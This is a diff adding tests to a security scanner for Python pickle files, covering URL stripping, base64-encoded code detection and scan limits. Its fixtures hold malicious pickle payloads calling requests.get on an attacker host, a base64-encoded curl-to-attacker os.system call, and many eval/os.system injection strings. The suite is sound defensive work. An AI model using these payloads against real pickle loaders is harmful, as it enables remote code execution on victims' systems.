@@ -90,6 +90,37 @@ EXPECTED_SYSTEM_GLOBAL = _expected_system_global()
 SYSTEM_GLOBALS = frozenset({"os.system", EXPECTED_SYSTEM_GLOBAL, "nt.system", "posix.system"})
 
 
+def _assert_clean_report(report: PickleReport) -> None:
+    assert report.status == ScanStatus.COMPLETE
+    assert report.verdict == SafetyVerdict.CLEAN
+    assert report.findings == ()
+
+
+def _assert_suspicious_string_report(report: PickleReport, pattern: str) -> None:
+    assert report.status == ScanStatus.COMPLETE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == pattern
+        for finding in report.findings
+    )
+
+
+def _assert_inconclusive_without_findings(
+    report: PickleReport,
+    notice_code: str,
+    *,
+    analysis_incomplete: bool | None = None,
+) -> None:
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert report.findings == ()
+    assert any(
+        notice.code == notice_code
+        and (analysis_incomplete is None or notice.details.get("analysis_incomplete") is analysis_incomplete)
+        for notice in report.notices
+    )
+
+
 def _isolate_reusable_meta_path_finders(monkeypatch: pytest.MonkeyPatch) -> None:
     monkeypatch.setattr(
         sys,
@@ -2871,6 +2902,34 @@ def test_scan_bytes_flags_canonical_pytorch_storage_persistent_ids() -> None:
     )
     assert not any(finding.rule_code == "DANGEROUS_CALL_GRAPH" for finding in report.findings)
     assert report.notices == ()
+
+
+def test_scan_bytes_marks_pytorch_storage_persistent_id_in_follow_on_control_stream() -> None:
+    payload = pickle.dumps({"protocol_version": 1001}, protocol=5) + _pytorch_storage_persistent_id_payload(
+        "k", storage_name="ByteStorage"
+    )
+
+    report = scan_bytes(payload, source="legacy-control-streams.pkl")
+
+    assert report.status == ScanStatus.COMPLETE
+    import_references = cast(tuple[dict[str, object], ...], report.metadata.get("import_references", ()))
+    assert any(
+        reference.get("import_reference") == "torch.ByteStorage"
+        and reference.get("pytorch_storage_persistent_id") is True
+        for reference in import_references
+    )
+    assert not any(finding.rule_code == "DANGEROUS_CALL_GRAPH" for finding in report.findings)
+
+
+def test_pytorch_storage_parser_rejects_malformed_bytes_after_control_streams() -> None:
+    payload = pickle.dumps({"protocol_version": 1001}, protocol=5) + _pytorch_storage_persistent_id_payload(
+        "k", storage_name="ByteStorage"
+    )
+
+    parsed = package_api._pytorch_storage_keys_from_pickle_bytes(payload + b"\xff")
+
+    assert parsed.parse_complete is False
+    assert parsed.all_persistent_ids_are_pytorch_storage is False
 
 
 def test_scan_bytes_marks_global_pytorch_storage_persistent_id_import_reference() -> None:
@@ -5818,6 +5877,55 @@ def test_scan_bytes_allows_common_dunder_metadata_literals() -> None:
     assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
 
 
+@pytest.mark.parametrize(
+    "metadata",
+    [
+        " ".join(["documentationword"] * 33),
+        " ".join(["documentationword"] * 32 + ["prefixZXZhsuffix"]),
+    ],
+    ids=["plain-words", "seed-like-final-word"],
+)
+def test_scan_bytes_does_not_treat_plain_words_as_base64_tokens(metadata: str) -> None:
+    report = scan_bytes(pickle.dumps({"metadata": metadata}, protocol=4), source="plain-words.pkl")
+
+    _assert_clean_report(report)
+
+
+@pytest.mark.parametrize(
+    ("metadata", "notice_code", "message", "limit_name", "limit"),
+    [
+        (
+            " ".join(["https://example.invalid/docs/os.system(cmd)"] * 129),
+            "url_scan_limit_exceeded",
+            "URL stripping scan exceeded its bounded span limit",
+            "max_url_spans",
+            128,
+        ),
+        (
+            ",".join(["prefixZXZhsuffix"] * 257),
+            "base64_text_scan_limit_exceeded",
+            "Base64 text scan exceeded its bounded candidate limit",
+            "max_base64_candidates",
+            256,
+        ),
+    ],
+    ids=["url-spans", "base64-candidates"],
+)
+def test_scan_bytes_reports_bounded_inert_text_limits(
+    metadata: str,
+    notice_code: str,
+    message: str,
+    limit_name: str,
+    limit: int,
+) -> None:
+    report = scan_bytes(pickle.dumps({"metadata": metadata}, protocol=4), source="bounded-text.pkl")
+
+    _assert_inconclusive_without_findings(report, notice_code, analysis_incomplete=True)
+    notice = next(notice for notice in report.notices if notice.code == notice_code)
+    assert notice.message == message
+    assert notice.details[limit_name] == limit
+
+
 def test_scan_bytes_allows_benign_security_documentation_strings() -> None:
     report = scan_bytes(
         pickle.dumps(
@@ -5838,18 +5946,118 @@ def test_scan_bytes_allows_benign_security_documentation_strings() -> None:
         source="security-docs.pkl",
     )
 
+    _assert_clean_report(report)
+
+
+@pytest.mark.parametrize(
+    "literal",
+    [
+        "https://example.invalid/docs/os.system(command)",
+        "https://example.invalid/api/subprocess.run(args)",
+        "https://example.invalid/reference/requests.get(url)",
+        "https://example.invalid/reference/httpx.get(url)",
+        "https://example.invalid/path?x=1&handler=requests.get(url)",
+        "https://example.invalid/path?x=1&handler=os.system(cmd)",
+        "https://example.invalid/path?x=1;handler=requests.get(url)",
+        "https://example.invalid/path?x=1,handler=httpx.get(url)",
+        "https://user:pass@example.invalid/reference/os.system(cmd)",
+        "https://example.invalid/a'b/os.system(cmd)",
+        "https://example.invalid/%E2%98%83/%00/reference/subprocess.run(args)",
+        "prefix\x00https://example.invalid/reference/requests.get(url)\x1fsuffix",
+        "https://github.com/example/project/blob/main/loader.py",
+        "s3://bucket/docs/os.system(cmd)",
+        "ftp://example.invalid/docs/subprocess.run(args)",
+        "Author's docs: https://example.invalid/a'b/os.system(cmd)",
+        'foo(R"s A https://a;eval(x)")',
+    ],
+)
+@pytest.mark.parametrize("protocol", [0, pickle.HIGHEST_PROTOCOL])
+def test_scan_bytes_allows_inert_url_literals_with_executable_terms(literal: str, protocol: int) -> None:
+    report = scan_bytes(pickle.dumps({"metadata_url": literal}, protocol=protocol), source="url-metadata.pkl")
+
+    _assert_clean_report(report)
+
+
+def test_scan_bytes_reports_bounded_long_unquoted_url_prose() -> None:
+    literal = ("A" * 16384) + " docs: https://example.invalid/a'b/os.system(cmd)"
+
+    report = scan_bytes(pickle.dumps({"metadata": literal}, protocol=4), source="long-url-prose.pkl")
+
+    _assert_inconclusive_without_findings(report, "url_context_proof_incomplete")
+    notice = next(notice for notice in report.notices if notice.code == "url_context_proof_incomplete")
+    assert notice.message == "URL stripping could not prove bounded lexical context"
+    assert notice.details["bounded_context_proof"] == 1
+
+
+def test_scan_bytes_keeps_locally_quoted_url_inert_at_url_count_cap() -> None:
+    literal = " ".join(["https://a"] * 128 + ["'https://a;eval(x)'", '"https://a;eval(x)"'])
+
+    report = scan_bytes(pickle.dumps({"metadata": literal}, protocol=4), source="quoted-url-cap.pkl")
+
+    _assert_inconclusive_without_findings(report, "url_scan_limit_exceeded")
+
+
+def test_scan_bytes_preserves_direct_call_after_url_count_cap() -> None:
+    literal = " ".join(["https://a"] * 128 + ["https://a;eval(y)"])
+
+    report = scan_bytes(pickle.dumps({"code": literal}, protocol=4), source="url-cap-code.pkl")
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert [
+        finding.details.get("pattern") for finding in report.findings if finding.rule_code == "SUSPICIOUS_STRING"
+    ] == ["eval("]
+    assert any(notice.code == "url_scan_limit_exceeded" for notice in report.notices)
+
+
+def test_scan_bytes_allows_inert_url_literal_with_base64_execution_query() -> None:
+    encoded = base64.b64encode(b"os.system('id')").decode("ascii")
+
+    report = scan_bytes(
+        pickle.dumps({"metadata_url": f"https://example.invalid/path?q={encoded}"}, protocol=4),
+        source="url-base64-metadata.pkl",
+    )
+
+    _assert_clean_report(report)
+
+
+@pytest.mark.parametrize(
+    ("payload", "import_reference"),
+    [
+        (b"crequests\nget\n(Vhttps://attacker.example/payload\ntR.", "requests.get"),
+    ],
+)
+def test_scan_bytes_keeps_network_url_reducers_actionable(payload: bytes, import_reference: str) -> None:
+    report = scan_bytes(payload, source="network-reducer.pkl")
+
     assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    assert report.verdict == SafetyVerdict.MALICIOUS
+    assert any(
+        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") == import_reference
+        for finding in report.findings
+    )
+
+
+def test_scan_bytes_keeps_build_url_state_actionable() -> None:
+    payload = b"c__main__\nRemoteLoader\n)R}Vendpoint\nVhttps://attacker.example/payload\nsb."
+
+    report = scan_bytes(payload, source="main-build-url-state.pkl")
+
+    assert report.status == ScanStatus.COMPLETE
+    assert report.verdict == SafetyVerdict.MALICIOUS
+    assert any(
+        finding.rule_code == "DANGEROUS_CALL"
+        and finding.details.get("opcode") == "BUILD"
+        and finding.details.get("import_reference") == "__main__.RemoteLoader"
+        for finding in report.findings
+    )
 
 
 @pytest.mark.parametrize("literal", ["__a__", "__x_y__"])
 def test_scan_bytes_allows_user_defined_dunder_metadata_literals(literal: str) -> None:
     report = scan_bytes(pickle.dumps({"metadata": literal}, protocol=4), source="user-dunder.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
 
 
 @pytest.mark.parametrize(
@@ -5862,24 +6070,132 @@ def test_scan_bytes_allows_user_defined_dunder_metadata_literals(literal: str) -
         ("joblib.load(path)", "pickle loader call"),
         ("cloudpickle.loads(blob)", "pickle loader call"),
         ("copyreg.add_extension(module, name, code)", "copyreg extension"),
+        ("x={'u':'https://a','x':os.system('id')}", "os.system"),
+        (r"u='Author\'s https://a',os.system('id')", "os.system"),
+        ("u='" + ("A" * 16385) + " https://a',os.system('id')", "os.system"),
+        ("u='" + ("A" * 16385) + " https://a'.format(os.system('id'))", "os.system"),
+        ("u='" + ("A" * 16385) + " https://a'[eval(x)]", "eval("),
+        ("u='" + ("A" * 600) + " https://a'@os.system('id')", "os.system"),
+        ("u='" + ("A" * 600) + " https://a'==eval(x)", "eval("),
+        ("u='" + ("A" * 600) + " https://a'!=eval(x)", "eval("),
+        ("u='" + ("A" * 600) + " https://a'(eval(x))", "eval("),
+        ("{'" + ("A" * 600) + " https://a':eval(x)}", "eval("),
+        ("['" + ("A" * 600) + " https://a'][eval(x)]", "eval("),
+        ("('" + ("A" * 600) + " https://a')[eval(x)]", "eval("),
+        ("'" + ("A" * 600) + " https://a'and(os.system('id'))", "os.system"),
+        ("'" + ("A" * 600) + " https://a'if(os.system('id'))else''", "os.system"),
+        ("https://attacker.example/payload;eval(x)", "eval("),
+        ("作者's docs: https://a;eval(x); payload='end'", "eval("),
+        ("https://attacker.example/payload$(eval(x))", "eval("),
+        ("https://attacker.example/payload;eval (x)", "eval("),
+        ("https://attacker.example/payload;+eval(x)", "eval("),
+        ("https://attacker.example/payload;[eval(x)]", "eval("),
+        ("'' https://attacker.example/payload;eval(x)", "eval("),
+        ('"" https://attacker.example/payload;eval(x)', "eval("),
+        ("x='!'; https://attacker.example/payload;eval(x)", "eval("),
+        ('x="!"; https://attacker.example/payload;eval(x)', "eval("),
+        ("# docs '\nhttps://attacker.example/payload;eval(x)", "eval("),
+        ('# docs "\nhttps://attacker.example/payload;eval(x)', "eval("),
+        ("echo foo#bar https://attacker.example/payload;eval(x)", "eval("),
+        ("foo# docs https://attacker.example/payload&&eval(x)", "eval("),
+        ("/tmp/#tag https://attacker.example/payload;eval(x)", "eval("),
+        ("foo-#bar https://attacker.example/payload;eval(x)", "eval("),
+        ("x=#tag https://attacker.example/payload;eval(x)", "eval("),
+        ('u="https://attacker.example/payload$(eval(x))"', "eval("),
+        ('echo "https://attacker.example/payload$(eval(x))"', "eval("),
+        ('u="https://attacker.example/payload`eval(x)`"', "eval("),
+        ("https://attacker.example/payload;eval\\\n(x)", "eval("),
+        ("https://attacker.example/payload;eval\\\r\n(x)", "eval("),
+        ("https://attacker.example/payload;os.system\\\n('id')", "os.system"),
+        ("https://attacker.example/payload;os.\\\nsystem('id')", "os.system"),
+        ("https://attacker.example/payload;os \\\n. system('id')", "os.system"),
+        (r'u="https://attacker.example/payload\\$(eval(x))"', "eval("),
+        (r"u='https://attacker.example/payload\';eval(x)'", "eval("),
+        (r"u='https://attacker.example/payload\'&&eval(x)'", "eval("),
+        (r"u='https://attacker.example/payload\'foo;eval(x)'", "eval("),
+        (r"u='https://attacker.example/payload\'/path&&eval(x)'", "eval("),
+        (r"u='https://attacker.example/payload\'foo$(eval(x))'", "eval("),
+        (r"u='https://attacker.example/payload\'foo`eval(x)`'", "eval("),
+        ("https://attacker.example/payload;" + ("+" * 300) + "eval(x)", "eval("),
+        ("r'https://a';eval(x)", "eval("),
+        ("u='''https://a''';eval(x)", "eval("),
+        ("x=f'https://a/{eval(x)}'", "eval("),
+        ("x=fr'https://a/{os.system(\"id\")}'", "os.system"),
+        ('x=f"""https://a/{__import__("os")}"""', "__import__("),
+        (r"x=f'https://a/\{eval(y)}'", "eval("),
+        ("x=f'https://a/{{{eval(y)}}}'", "eval("),
+        ('x=f"{ "" } https://a/{eval(y)}"', "eval("),
+        ("x=f\"{f'https://a/{eval(y)}'}\"", "eval("),
+        ("x=f\"{fr'https://a/{eval(y)}'}\"", "eval("),
+        ('x=f"{value:https://a/{eval(y)}}"', "eval("),
+        ("x=f\"{value# '\n}\";u='https://a';eval(y)", "eval("),
+        ("x# '\nu='https://a'+eval(y)", "eval("),
+        ("x=f'" + ("A" * 600) + "https://a/{eval(x)}'", "eval("),
+        (
+            'x="""' + ("A" * 600) + ' """;u=\'https://a\';eval(y);z="""end"""',
+            "eval(",
+        ),
+        ("x='" + ("A" * 600) + " https://a';x,y=eval(z)", "eval("),
+        ("x='" + ("A" * 600) + " https://a';[x,y]=eval(z)", "eval("),
+        ("x='" + ("A" * 600) + " https://a';(x,y)=eval(z)", "eval("),
+        ("x='" + ("A" * 600) + " https://a';x:int=eval(z)", "eval("),
     ],
 )
 def test_scan_bytes_flags_expanded_suspicious_string_patterns(literal: str, expected_pattern: str) -> None:
     report = scan_bytes(pickle.dumps({"code": literal}), source="string-pattern.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.SUSPICIOUS
-    assert any(
-        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == expected_pattern
-        for finding in report.findings
-    )
+    _assert_suspicious_string_report(report, expected_pattern)
+
+
+@pytest.mark.parametrize(
+    "literal",
+    [
+        'x=1# """\nu=\'https://a\';eval(x)\ny=2# """',
+        's = "x=" +' + (" " * 511) + '""" \' https://a """; eval(x); y=\'foo\'',
+        'z=\'#\'; x=""" \' https://a """; eval(x); y=\'foo\'',
+    ],
+    ids=["inline-comment", "bounded-prefix", "hash-inside-string"],
+)
+def test_scan_bytes_preserves_call_after_inline_comment_quotes(literal: str) -> None:
+    compile(literal, "comment-url.py", "exec")
+
+    raw_report = scan_bytes(pickle.dumps({"code": literal}), source="comment-url.pkl")
+    encoded = base64.b64encode(literal.encode()).decode()
+    encoded_report = scan_bytes(pickle.dumps({"code": encoded}), source="encoded-comment-url.pkl")
+
+    _assert_suspicious_string_report(raw_report, "eval(")
+    _assert_suspicious_string_report(encoded_report, "base64 eval(")
 
 
 @pytest.mark.parametrize(
     ("literal", "pattern"),
     [
         (b"os.system('id')", "base64 os.system"),
+        (b"os.system('curl https://attacker.example/payload')", "base64 os.system"),
         (b"eval(x)", "base64 eval("),
+        (b"u='https://a'+os.system('id')", "base64 os.system"),
+        (b"u='https://a'-os.system('id')", "base64 os.system"),
+        (b"u='https://a'/os.system('id')", "base64 os.system"),
+        (b"u='https://a'%os.system('id')", "base64 os.system"),
+        (b"u='https://a' + os.system('id')", "base64 os.system"),
+        (b"https://a'-os.system('id')", "base64 os.system"),
+        (b"https://a'+eval(x)", "base64 eval("),
+        ("作者's docs: https://a;eval(x); payload='end'".encode(), "base64 eval("),
+        (b"EVAL(x)", "base64 eval("),
+        (b"EXEC(x)", "base64 exec("),
+        (b'OS.SYSTEM("id")', "base64 os.system"),
+        (b"SUBPROCESS.RUN(x)", "base64 subprocess"),
+        (b'__IMPORT__("os")', "base64 __import__"),
+        (b"https://attacker.example/payload$(eval(x))", "base64 eval("),
+        (b"getattr(os,'system')('id')", "base64 os.system"),
+        (b"os.system.__call__('id')", "base64 os.system"),
+        (b"((os.system))('id')", "base64 os.system"),
+        (b"f: object = os.system;f('id')", "base64 os.system"),
+        (b"x=f'https://a/{eval(y)}'", "base64 eval("),
+        (b"x=f\"{f'https://a/{eval(y)}'}\"", "base64 eval("),
+        (b'x=f"{value:https://a/{eval(y)}}"', "base64 eval("),
+        (b"x=f\"{value# '\n}\";u='https://a';eval(y)", "base64 eval("),
+        (b"x# '\nu='https://a'+eval(y)", "base64 eval("),
     ],
 )
 def test_scan_bytes_flags_base64_encoded_code_string_literals(literal: bytes, pattern: str) -> None:
@@ -5887,12 +6203,118 @@ def test_scan_bytes_flags_base64_encoded_code_string_literals(literal: bytes, pa
 
     report = scan_bytes(pickle.dumps({"code": encoded}), source="encoded-code-string.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
+    _assert_suspicious_string_report(report, pattern)
+
+
+def test_scan_bytes_preserves_base64_finding_before_total_work_limit() -> None:
+    encoded = base64.b64encode(b"eval(x)\n" + (b"A" * 100_000)).decode("ascii")
+
+    report = scan_bytes(pickle.dumps({"code": encoded}), source="bounded-base64-work.pkl")
+
+    assert report.status == ScanStatus.INCONCLUSIVE
     assert report.verdict == SafetyVerdict.SUSPICIOUS
-    assert any(
-        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == pattern
-        for finding in report.findings
-    )
+    assert any(finding.details.get("pattern") == "base64 eval(" for finding in report.findings)
+    notice = next(notice for notice in report.notices if notice.code == "base64_text_work_limit_exceeded")
+    assert notice.message == "Base64 text scan exhausted its bounded total work budget"
+    assert notice.details["max_base64_scan_chars"] == 8 * 16 * 1024
+
+
+def test_scan_bytes_does_not_join_base64_fragments_across_removed_url() -> None:
+    metadata = "ZXZh https://example.invalid/docs bCh4KQ=="
+
+    report = scan_bytes(pickle.dumps({"metadata": metadata}), source="url-delimited-base64.pkl")
+
+    _assert_clean_report(report)
+
+
+@pytest.mark.parametrize(
+    "literal",
+    [
+        b"X os.system is documented",
+        b"x == os.system",
+        b"https://a/path;section=eval(x)",
+        b"https://a/path;handler=os.system(cmd)",
+        b'x=f"{value:https://a;eval(y)}"',
+    ],
+)
+def test_scan_bytes_allows_base64_encoded_inert_references(literal: bytes) -> None:
+    encoded = base64.b64encode(literal).decode("ascii")
+
+    report = scan_bytes(pickle.dumps({"metadata": encoded}), source="encoded-inert-reference.pkl")
+
+    _assert_clean_report(report)
+
+
+def test_scan_bytes_does_not_promote_url_limit_sentinel_to_base64_finding() -> None:
+    decoded = b" http://a/eval(x)" * 129
+    encoded = "A ZXZhbCh4KQA" + base64.b64encode(decoded).decode("ascii")
+
+    report = scan_bytes(pickle.dumps({"metadata": encoded}), source="url-limit-base64-alignment.pkl")
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert report.findings == ()
+    assert any(notice.code == "url_scan_limit_exceeded" for notice in report.notices)
+    assert any(notice.code == "base64_text_alignment_ambiguous" for notice in report.notices)
+
+
+@pytest.mark.parametrize(
+    "encoded",
+    ["ZX\nZh\nbC\nh4\nKQ\n=="],
+)
+def test_scan_bytes_flags_mime_wrapped_base64_execution_text(encoded: str) -> None:
+    assert base64.b64decode(encoded) == b"eval(x)"
+
+    report = scan_bytes(pickle.dumps({"code": encoded}, protocol=4), source="mime-base64-code.pkl")
+
+    _assert_suspicious_string_report(report, "base64 eval(")
+
+
+def test_scan_bytes_flags_mime_wrapped_base64_after_plain_prose_prefix() -> None:
+    contiguous = base64.b64encode(b"eval(x)").decode("ascii")
+    encoded = "payload\r\n" + "\t".join(contiguous[index : index + 3] for index in range(0, len(contiguous), 3))
+
+    report = scan_bytes(pickle.dumps({"code": encoded}, protocol=4), source="prefixed-mime-base64-code.pkl")
+
+    _assert_suspicious_string_report(report, "base64 eval(")
+
+
+def test_scan_bytes_does_not_realign_contiguous_valid_benign_base64() -> None:
+    encoded = "AZXZhbCh4KQA"
+    decoded = base64.b64decode(encoded)
+    assert b"eval" not in decoded
+
+    report = scan_bytes(pickle.dumps({"metadata": encoded}, protocol=4), source="benign-base64.pkl")
+
+    _assert_clean_report(report)
+
+
+@pytest.mark.parametrize("separator", [" ", "\n", "\r\n"], ids=["space", "lf", "crlf"])
+def test_scan_bytes_reports_ambiguous_valid_whitespace_base64_alignment(separator: str) -> None:
+    encoded = "A" + separator + "ZXZhbCh4KQA"
+    assert b"eval" not in base64.b64decode(encoded)
+
+    report = scan_bytes(pickle.dumps({"metadata": encoded}, protocol=4), source="ambiguous-base64.pkl")
+
+    _assert_inconclusive_without_findings(report, "base64_text_alignment_ambiguous")
+
+
+def test_scan_bytes_flags_urlsafe_base64_execution_text() -> None:
+    encoded = base64.urlsafe_b64encode(b"\xf8eval(x)").decode("ascii")
+    assert base64.urlsafe_b64decode(encoded)[-7:] == b"eval(x)"
+
+    report = scan_bytes(pickle.dumps({"code": encoded}, protocol=4), source="urlsafe-base64-code.pkl")
+
+    _assert_suspicious_string_report(report, "base64 eval(")
+
+
+@pytest.mark.parametrize("literal", [b"\xff\ngetattr(os,'system')('id')", b"\xff\nos . system('id')"])
+def test_scan_bytes_flags_urlsafe_base64_non_utf8_execution_text(literal: bytes) -> None:
+    encoded = base64.urlsafe_b64encode(literal).decode("ascii")
+
+    report = scan_bytes(pickle.dumps({"code": encoded}, protocol=4), source="urlsafe-non-utf8-code.pkl")
+
+    _assert_suspicious_string_report(report, "base64 os.system")
 
 
 def test_scan_bytes_can_decode_stack_global_from_memoized_operands() -> None:
@@ -5913,9 +6335,7 @@ def test_scan_bytes_keeps_stack_global_metadata_attributes_clean(name: str) -> N
 
     report = scan_bytes(payload, source=f"{name}.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
 
 
 def test_scan_bytes_warns_on_functools_partial_without_marking_benign_partial_malicious() -> None:
@@ -6025,9 +6445,7 @@ def test_scan_bytes_allows_benign_pathlib_path_constructor() -> None:
 
     report = scan_bytes(payload, source="pathlib-constructor.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
 
 
 def test_scan_bytes_allows_python313_pathlib_local_pure_path_constructor() -> None:
@@ -6035,9 +6453,7 @@ def test_scan_bytes_allows_python313_pathlib_local_pure_path_constructor() -> No
 
     report = scan_bytes(payload, source="python313-pathlib-local-constructor.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
 
 
 @pytest.mark.parametrize(
@@ -6684,9 +7100,7 @@ def test_scan_bytes_allows_local_container_mutations(payload: bytes) -> None:
 
     report = scan_bytes(payload, source="local-container-mutation.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
 
 
 def test_scan_bytes_detects_operator_setitem_constructed_object_protocol() -> None:
@@ -6808,9 +7222,7 @@ def test_scan_bytes_allows_trusted_dill_dump_import_only(
 
     report = scan_bytes(b"cdill\ndump\n.", source="dill-dump-import-only.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
 
 
 def test_scan_bytes_requires_source_analysis_for_invoked_trusted_dill_dump(
@@ -6946,9 +7358,7 @@ def test_scan_bytes_allows_benign_dill_text_literal() -> None:
 
     report = scan_bytes(payload, source="dill-note.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
 
 
 @pytest.mark.parametrize(
@@ -7049,16 +7459,32 @@ def test_scan_bytes_does_not_treat_benign_stdlib_module_references_as_dangerous(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     module_name, _, reference_name = expected_reference.partition(".")
+    reference_key = (module_name, reference_name)
     with monkeypatch.context() as patch:
-        if (module_name, reference_name) not in _TRUSTED_LOADED_REFERENCE_BASELINES:
+        baseline = _TRUSTED_LOADED_REFERENCE_BASELINES.get(reference_key)
+        if baseline is None:
             patch.delitem(sys.modules, module_name, raising=False)
+        elif type(baseline[0][1]) is ModuleType:
+            patch.setitem(sys.modules, module_name, baseline[0][1])
         _clear_source_sensitive_caches()
         report = scan_bytes(payload, source=f"{expected_reference}.pkl")
     _clear_source_sensitive_caches()
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    if expected_reference == "tarfile.TarInfo" and report.status == ScanStatus.INCONCLUSIVE:
+        assert report.verdict in {SafetyVerdict.UNKNOWN, SafetyVerdict.SUSPICIOUS}
+        assert report.metadata.get("analysis_incomplete") is True
+        assert all(
+            finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
+            and finding.severity == Severity.WARNING
+            and finding.details.get("import_reference") == expected_reference
+            and finding.details.get("module") == "tarfile"
+            and finding.details.get("name") == "TarInfo"
+            for finding in report.findings
+        )
+    else:
+        assert report.status == ScanStatus.COMPLETE
+        assert report.verdict == SafetyVerdict.CLEAN
+        assert report.findings == ()
     assert any(
         ref["import_reference"] == expected_reference and ref["is_dangerous"] is False
         for ref in report.metadata["import_references"]
@@ -8442,9 +8868,7 @@ def test_scan_bytes_allows_trusted_argparse_namespace() -> None:
 
     report = scan_bytes(payload, source="argparse-namespace.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
 
 
 def test_scan_bytes_warns_when_argparse_namespace_resolves_to_shadow_module(
@@ -8560,9 +8984,7 @@ def test_scan_bytes_allows_trusted_origin_when_call_graph_enrichment_is_disabled
         enrich_call_graph=False,
     )
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
     assert report.private_metadata["call_graph_source_fingerprints"]["reusable"] is True
 
 
@@ -10379,9 +10801,7 @@ def test_scan_bytes_keeps_allowlisted_import_only_global_clean() -> None:
 
     report = scan_bytes(payload, source="ordered-dict-global.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
     assert any(
         ref["import_reference"] == "collections.OrderedDict" and ref["is_dangerous"] is False
         for ref in report.metadata["import_references"]
@@ -11226,9 +11646,7 @@ def test_scan_bytes_skips_call_graph_enrichment_without_references(
 
     report = scan_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4), source="no-references.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
     assert report.private_metadata["call_graph_source_fingerprints"] == {
         "reusable": True,
         "source_independent": True,
@@ -11943,9 +12361,7 @@ def test_scan_bytes_does_not_scan_raw_binbytes_payloads_as_text_strings() -> Non
 
     report = scan_bytes(payload, source="tensor-bytes.pkl")
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
 
 
 def test_scan_bytes_records_data_only_raw_nested_pickle_payloads_as_notices() -> None:
@@ -12003,9 +12419,7 @@ def test_scan_bytes_allows_nested_import_only_trusted_constructor() -> None:
         source="nested-trusted-decimal.pkl",
     )
 
-    assert report.status == ScanStatus.COMPLETE
-    assert report.verdict == SafetyVerdict.CLEAN
-    assert report.findings == ()
+    _assert_clean_report(report)
 
 
 @pytest.mark.parametrize(
@@ -12868,6 +13282,548 @@ def test_scan_bytes_flags_suspicious_literal_content_beyond_default_prefix_suffi
     report = scan_bytes(
         pickle.dumps({"code": hidden_payload}, protocol=4),
         source="middle-hidden-large-string.pkl",
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.SUSPICIOUS
+    assert any(
+        finding.rule_code == "SUSPICIOUS_STRING" and finding.details.get("pattern") == "os.system"
+        for finding in report.findings
+    )
+    assert any(notice.code == "literal_scan_truncated" for notice in report.notices)
+
+
+@pytest.mark.parametrize("protocol", [0, pickle.HIGHEST_PROTOCOL])
+def test_scan_bytes_keeps_cross_window_url_continuation_inert(protocol: int) -> None:
+    literal = "https://example.invalid/" + ("a" * (8 * 1024 * 1024)) + "os.system(cmd)"
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=protocol),
+        source=f"cross-window-url-protocol-{protocol}.pkl",
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
+    assert not any(finding.rule_code == "SUSPICIOUS_STRING" for finding in report.findings)
+
+
+@pytest.mark.parametrize("protocol", range(pickle.HIGHEST_PROTOCOL + 1))
+def test_scan_bytes_carries_quote_context_to_later_overlap_url(protocol: int) -> None:
+    window_chars = 8 * 1024 * 1024
+    literal = (
+        "metadata='" + ("A" * (window_chars - 2000)) + "https://example.invalid/" + ("x" * 4000) + ";os.system(cmd)'"
+    )
+
+    report = scan_bytes(
+        pickle.dumps({"metadata": literal}, protocol=protocol),
+        source=f"later-overlap-url-protocol-{protocol}.pkl",
+    )
+
+    assert report.status == ScanStatus.INCONCLUSIVE
+    assert report.verdict == SafetyVerdict.UNKNOWN
